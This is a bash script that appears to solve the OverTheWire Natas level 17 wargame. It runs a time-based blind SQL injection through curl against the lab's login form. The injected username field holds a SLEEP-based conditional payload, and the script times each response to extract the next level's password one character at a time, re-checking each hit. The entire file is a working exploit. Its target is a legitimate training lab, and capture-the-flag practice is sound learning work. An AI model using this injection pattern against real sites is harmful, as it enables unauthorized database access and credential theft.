#!/bin/bash

[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }

URL="http://natas17.natas.labs.overthewire.org/"
AUTH="natas17:$1"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

SLEEP_TIME=3
THRESHOLD=2500   # ms

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    # First measurement
    start=$(date +%s%3N) # Millisecond precision!

    curl -s -u $AUTH \
      --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
      "$URL" > /dev/null

    end=$(date +%s%3N) # Millisecond precision!
    elapsed=$((end - start))

    if [[ $elapsed -ge $THRESHOLD ]]; then

      # Confirm (second measurement)
      start=$(date +%s%3N)

      curl -s -u $AUTH \
        --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
        "$URL" > /dev/null

      end=$(date +%s%3N)
      elapsed2=$((end - start))

      if [[ $elapsed2 -ge $THRESHOLD ]]; then
        password+=$c
        len=${#password} # Avoid syntax error in echo.
        echo "[+] $password (${len}/32)"
        break
      fi

    fi

  done
done

echo
echo "[✔] Password: $password"